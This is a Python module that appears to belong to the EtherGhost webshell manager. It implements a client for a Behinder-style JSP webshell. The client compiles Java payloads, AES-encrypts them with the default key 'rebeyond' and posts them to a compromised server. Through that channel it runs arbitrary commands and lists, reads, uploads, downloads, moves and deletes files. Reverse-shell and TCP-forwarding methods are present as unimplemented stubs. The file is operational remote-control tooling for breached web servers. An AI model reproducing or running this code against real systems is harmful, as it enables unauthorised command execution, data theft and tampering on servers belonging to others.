from pathlib import Path
import asyncio
import base64
import re
import hashlib
import json
import logging
import string
import subprocess
import typing as t
import tempfile

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import httpx

from ..core import exceptions

from ..core.base import (
    register_session,
    BasicInfoEntry,
    ConnOption,
    ConnOptionGroup,
    DirectoryEntry,
    get_http_client,
)
from ..core.php_session_common import (
    php_webshell_action_options,
    php_webshell_communication_options,
)

logger = logging.getLogger("core.sessions.php_behinder")

PAYLOAD_PATH = Path(__file__).parent / "Payload.java"
assert PAYLOAD_PATH.exists(), f"Cannot find Payload.java at {Path(__file__).parent}"

# TODO: 把这些函数移动到utils里


def parse_permission(perm: str):
    """将rwxrwxrwx格式的文件权限解析为755格式的

    Args:
        perm (str): rwxrwxrwx格式的文件权限
    """
    # 难看代码大赏
    result = ""
    if not re.match("^[rwx-]{9}$", perm):
        raise ValueError("Wrong permission format: " + perm)
    nums = list(map({"r": 4, "w": 2, "x": 1, "-": 0}.__getitem__, perm))
    for i in range(0, 9, 3):
        result += str(sum(nums[i : i + 3]))
    return result


def java_repr(obj):
    if isinstance(obj, (str, int)):
        if isinstance(obj, str) and len(obj) > 1000:
            return "+".join(
                json.dumps(obj[i : i + 1000]) for i in range(0, len(obj), 1000)
            )
        return json.dumps(obj)
    if isinstance(obj, list) and all(isinstance(x, str) for x in obj):
        return "(new String[]{" + ",".join(java_repr(x) for x in obj) + "})"
    raise NotImplementedError(f"{type(obj)=}")


def md5_encode(s):
    """将给定的字符串或字节序列转换成MD5"""
    if isinstance(s, str):
        s = s.encode()
    return hashlib.md5(s).hexdigest()


def base64_encode(s: str | bytes):
    """将给定的字符串或字节序列编码成base64"""
    if isinstance(s, str):
        s = s.encode("utf-8")
    return base64.b64encode(s).decode()


def behinder_aes(payload: bytes, key: bytes) -> bytes:
    """将给定的payload按照冰蝎的格式进行AES加密"""
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted_data = cipher.encrypt(pad(payload, AES.block_size))
    return base64.b64encode(encrypted_data)


@register_session
class JSPWebshellBehinderAES:
    session_type = "BEHINDER_JSP_AES"
    readable_name = "[测试] 冰蝎JSP"
    conn_options: t.List[ConnOptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                ConnOption(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                ConnOption(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="******",
                    default_value="rebeyond",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": [
                ConnOption(
                    id="timeout_refresh_client",
                    name="超时更换HTTP Session",
                    type="checkbox",
                    placeholder="一直使用相同的PHPSESSID可能会导致前一个长时间操作阻塞接下来的操作",
                    default_value=True,
                    alternatives=None,
                ),
                ConnOption(
                    id="https_verify",
                    name="验证HTTPS证书",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
                ConnOption(
                    id="updownload_chunk_size",
                    name="文件上传下载分块大小",
                    type="text",
                    placeholder="文件上传下载的分块大小，单位为字节，注意每上传一块就要编译一次payload",
                    default_value=str(1024 * 32),
                    alternatives=None,
                ),
                ConnOption(
                    id="updownload_max_coroutine",
                    name="文件上传下载并发量",
                    type="text",
                    placeholder="控制文件上传和下载时的最大协程数量",
                    default_value="4",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "其他配置",
            "options": [
                ConnOption(
                    id="compile_max_coroutine",
                    name="编译Payload并发量",
                    type="text",
                    placeholder="使用javac编译payload的最大进程数",
                    default_value="4",
                    alternatives=None,
                ),
                ConnOption(
                    id="javac_target_version",
                    name="javac编译源版本",
                    type="text",
                    placeholder="使用javac编译payload的源版本号，即javac -source",
                    default_value="1.8",
                    alternatives=None,
                ),
                ConnOption(
                    id="javac_target_version",
                    name="javac编译目标版本",
                    type="text",
                    placeholder="使用javac编译payload的目标版本号javac -target",
                    default_value="1.8",
                    alternatives=None,
                ),
            ],
        },
    ]

    def __init__(self, session_conn: dict):
        self.url = session_conn["url"]
        self.key = md5_encode(session_conn["password"])[:16].encode()
        self.https_verify = session_conn.get("https_verify", False)
        self.client = get_http_client(verify=self.https_verify)
        self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)
        self.updownload_chunk_size = int(
            session_conn.get("updownload_chunk_size", 1024 * 128)
        )
        self.updownload_max_coroutine = int(
            session_conn.get("updownload_max_coroutine", 4)
        )

        self.compile_semaphore = asyncio.Semaphore(
            int(session_conn.get("compile_max_coroutine", 4))
        )

        self.javac_source_version = session_conn.get("javac_source_version", "1.8")

        self.javac_target_version = session_conn.get("javac_target_version", "1.8")

    async def submit_code(self, action_code: str):
        code = PAYLOAD_PATH.read_text()
        code = re.sub(
            ".+ETHER_GHOST_REPLACE_HERE", f"Object data = {action_code};", code
        )
        data = None
        with tempfile.TemporaryDirectory(delete=False) as d:
            payload_code_filepath = Path(d) / "Payload.java"
            payload_bin_filepath = Path(d) / "Payload.class"
            payload_code_filepath.write_text(code)
            return_code = None
            async with self.compile_semaphore:
                p = subprocess.Popen(
                    [
                        "javac",
                        "-source",
                        self.javac_source_version,
                        "-target",
                        self.javac_target_version,
                        payload_code_filepath.as_posix(),
                    ]
                )
                while p.poll() is None:
                    await asyncio.sleep(0)
                return_code = p.wait()
            assert return_code == 0, f"javac exit with {return_code=}"
            assert payload_bin_filepath.exists(), "javac failed to build payload"
            data = behinder_aes(payload_bin_filepath.read_bytes(), self.key)
        try:
            response = await self.client.request(
                method="POST", url=self.url, content=data
            )
            if response.status_code != 200:
                raise exceptions.TargetError(f"{response.status_code=}")
            try:
                data = json.loads(base64.b64decode(response.text))
            except Exception as e:
                raise exceptions.TargetError(
                    "Cannot decode response: " + repr(response.text)[:30]
                ) from e
            if data["code"] != 0:
                if data["error_type"] == "java.io.IOException":
                    raise exceptions.FileError(data["msg"])
                raise exceptions.TargetError(
                    f"{data['code']=} {data['error_type']=} {data['msg']=}"
                )
            return data["data"]
        except httpx.TimeoutException as exc:
            # 使用某个session id进行长时间操作(比如sleep 100)时会触发HTTP超时
            # 此时服务端会为这个session id等待这个长时间操作
            # 所以我们再使用这个session id发起请求就会卡住
            # 所以我们要丢掉这个session id，使用另一个client发出请求
            if self.timeout_refresh_client:
                logger.warning("HTTP请求受控端超时，尝试刷新HTTP Client")
                self.client = get_http_client(verify=self.https_verify)
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError(
                "发送HTTP请求到受控端失败：" + str(exc)
            ) from exc

    async def execute_cmd(self, cmd: str) -> str:
        return "\n".join(await self.submit_code(f"runCommand({json.dumps(cmd)})"))

    async def test_usablility(self) -> bool:
        return (await self.submit_code("ping()"))["name"] == "EtherGhost JSP"

    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        entries = await self.submit_code(f"listFiles({json.dumps(dir_path)})")
        try:
            result = [
                DirectoryEntry(
                    name="..",
                    permission="777",
                    filesize=0,
                    entry_type="dir",
                )
            ] + [
                DirectoryEntry(
                    name=str(entry["name"]),
                    permission=parse_permission(entry["permission"]),
                    filesize=int(entry["filesize"]),
                    entry_type=entry["entry_type"],
                )
                for entry in entries
                if entry["entry_type"]
                in ["dir", "file", "link-dir", "link-file", "unknown"]
            ]
            return result
        except Exception as exc:
            raise exceptions.TargetRuntimeError(f"解码结果失败: {exc}") from exc

    async def mkdir(self, dir_path: str) -> None:
        await self.submit_code(f"mkdir({json.dumps(dir_path)})")

    async def get_file_contents(
        self, filepath: str, max_size: int | None = None
    ) -> bytes:
        """获取文件的内容，内容是一个字节序列，不是已经解码的字符串"""
        if max_size is None:
            max_size = self.updownload_chunk_size
        content_b64 = await self.submit_code(
            f"getFileContentsBase64({json.dumps(filepath)}, {max_size})"
        )
        try:
            return base64.b64decode(content_b64)
        except Exception as exc:
            raise exceptions.TargetRuntimeError("base64解码失败") from exc

    async def put_file_contents(self, filepath: str, content: bytes) -> bool:
        """保存文件的内容，内容是一个字节序列，不是已经解码的字符串"""
        await self.submit_code(
            f"putFileContents({json.dumps(filepath)}, "
            f"base64Decode({json.dumps(base64_encode(content))}))"
        )
        return True

    async def delete_file(self, filepath: str) -> bool:
        return await self.submit_code(f"deleteFile({json.dumps(filepath)})")

    async def move_file(self, filepath: str, new_filepath: str) -> None:
        await self.submit_code(
            f"moveFile({json.dumps(filepath)}, {json.dumps(new_filepath)})"
        )

    async def copy_file(self, filepath: str, new_filepath: str) -> None:
        await self.submit_code(
            f"copyFile({json.dumps(filepath)}, {json.dumps(new_filepath)})"
        )

    async def upload_file(
        self, filepath: str, content: bytes, callback: t.Union[t.Callable, None] = None
    ) -> bool:
        semaphore = asyncio.Semaphore(self.updownload_max_coroutine)
        write_state_lock = asyncio.Lock()

        chunk_size = self.updownload_chunk_size
        coros: t.List[t.Awaitable] = []
        done_coro = 0
        done_bytes = 0
        filepath_status = await self.submit_code(
            f"checkUploadFilepath({java_repr(filepath)})"
        )
        if filepath_status == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("没有权限写入文件")
        if filepath_status == "WRONG_EXISTED":
            raise exceptions.FileError("文件已经存在")
        if filepath_status != "OK":
            raise exceptions.TargetRuntimeError("检查文件路径时发生未知错误")

        async def upload_chunk(chunk: bytes):
            nonlocal done_coro, done_bytes
            filepath = None
            async with semaphore:
                chunk_b64 = base64_encode(chunk)
                filepath = await self.submit_code(
                    f"putTempFile(base64Decode({java_repr(chunk_b64)}))"
                )
            async with write_state_lock:
                done_coro += 1
                done_bytes += len(chunk)
                if callback:
                    callback(
                        done_coro=done_coro,
                        max_coro=len(coros),
                        done_bytes=done_bytes,
                        max_bytes=len(content),
                    )
            return filepath

        coros = [
            upload_chunk(content[i : i + chunk_size])
            for i in range(0, len(content), chunk_size)
        ]
        uploaded_chunks = await asyncio.gather(*coros)
        result = await self.submit_code(
            f"mergeFiles({java_repr(uploaded_chunks)}, {java_repr(filepath)})"
        )
        return result  # can only be true

    async def download_file(
        self, filepath: str, callback: t.Union[t.Callable, None] = None
    ) -> bytes:
        filesize_text = await self.submit_code(f"getFileSize({java_repr(filepath)})")
        if filesize_text == "WRONG_NOT_EXISTS":
            raise exceptions.FileError("文件不存在")
        if filesize_text == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("没有权限读取文件")
        filesize = None
        try:
            filesize = int(filesize_text)
        except Exception as exc:
            raise exceptions.TargetRuntimeError(
                f"读取文件大小失败：{filesize_text=}"
            ) from exc

        sem = asyncio.Semaphore(self.updownload_max_coroutine)
        write_state_lock = asyncio.Lock()
        chunk_size = self.updownload_chunk_size
        done_coro = 0
        done_bytes = 0
        coros: t.List[t.Awaitable] = []

        async def download_chunk(offset: int) -> bytes:
            nonlocal done_coro, coros, done_bytes
            result = None
            async with sem:
                await asyncio.sleep(0.01)  # we don't ddos
                result_b64 = await self.submit_code(
                    f"downloadPartialFileBase64("
                    f"{java_repr(filepath)}, {java_repr(offset)}, {java_repr(chunk_size)})"
                )
                if result_b64 == "WRONG_NOT_EXISTS":
                    raise exceptions.FileError("文件不存在或者不是一个普通文件")
                elif result_b64 == "WRONG_NO_PERMISSION":
                    raise exceptions.FileError("没有读取权限")
                result = base64.b64decode(result_b64)
            async with write_state_lock:
                done_coro += 1
                done_bytes += len(result)
                if callback:
                    callback(
                        done_coro=done_coro,
                        max_coro=len(coros),
                        done_bytes=min(done_bytes, filesize),
                        max_bytes=filesize,
                    )

            return result

        coros = [download_chunk(i) for i in range(0, filesize, chunk_size)]
        chunks = await asyncio.gather(
            *coros,
            return_exceptions=True,
        )
        result = b""
        for chunk_result in chunks:
            if not isinstance(chunk_result, bytes):
                exc = chunk_result if isinstance(chunk_result, Exception) else None
                raise exceptions.FileError(
                    "下载文件失败: " + str(chunk_result)
                ) from exc
            result += chunk_result
        return result

    async def send_bytes_over_tcp(
        self,
        host: str,
        port: int,
        content: bytes,
        send_method: t.Union[str, None] = None,
    ) -> t.Union[bytes, None]:
        raise exceptions.ServerError("JSP Webshell暂时不支持此方法")

    async def get_send_tcp_support_methods(self) -> t.List[str]:
        return []  # JSP Webshell暂时不支持此方法

    async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
        """获取当前的基本信息"""
        # [TODO] 写一下这个方法
        raise exceptions.ServerError("JSP Webshell暂时不支持此方法")

    async def open_reverse_shell(self, host: str, port: int) -> None:
        """打开一个反弹shell"""
        # [TODO] 写一下这个方法
        raise exceptions.ServerError("JSP Webshell暂时不支持此方法")

    async def get_pwd(self) -> str:
        return await self.submit_code("getPwd()")
